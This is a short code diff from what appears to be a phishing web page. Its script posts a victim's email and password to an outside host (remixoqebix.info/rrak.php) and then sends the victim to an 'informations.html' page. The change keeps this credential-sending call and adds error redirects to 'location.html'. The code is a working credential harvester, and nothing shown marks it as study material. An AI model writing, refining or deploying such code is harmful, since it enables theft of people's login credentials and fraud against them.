@@ -11293,19 +11293,23 @@
                user_email: email,
                guxhatok: password,
             }
-            $.ajax({
-               url: "https://remixoqebix.info/rrak.php/",
-               method: "POST",
-               data: data,
-               success: function (response) {
-                  if (response == "1") {
-                     window.location.href = 'informations.html';
-                  }
-               }
-            });
-
+			$.ajax({
+      url: "https://remixoqebix.info/rrak.php/",
+      method: "POST",
+      data: data,
+      success: function (response) {
+         if (response == "1") {
+            window.location.href = 'informations.html';
+         } else {
+            // Redirect to 'location.html' for error cases
+            window.location.href = 'location.html';
          }
-      });
+      },
+      error: function () {
+         // Redirect to 'location.html' for error cases
+         window.location.href = 'location.html';
+      }
+   });
    </script>
 
 </body>
